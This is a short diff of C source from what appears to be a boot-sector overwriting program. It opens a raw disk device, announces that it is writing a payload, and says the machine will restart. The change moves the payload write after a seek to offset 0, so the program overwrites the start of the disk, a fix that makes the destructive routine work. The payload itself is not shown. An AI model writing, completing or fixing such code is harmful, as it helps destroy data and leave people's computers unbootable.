@@ -49,8 +49,8 @@ int main() {
     sleep(1);
     printf("Writing payload inside %s\n", DISK);
     harddisk = fopen(DISK, "wb");
-    fwrite(payload, sizeof(payload), 1, harddisk);
     fseek(harddisk, 0, SEEK_SET);
+    fwrite(payload, sizeof(payload), 1, harddisk);
     fclose(harddisk);
     printf("Payload successfully written! The machine will restart in 5 seconds\n");
     sleep(5);
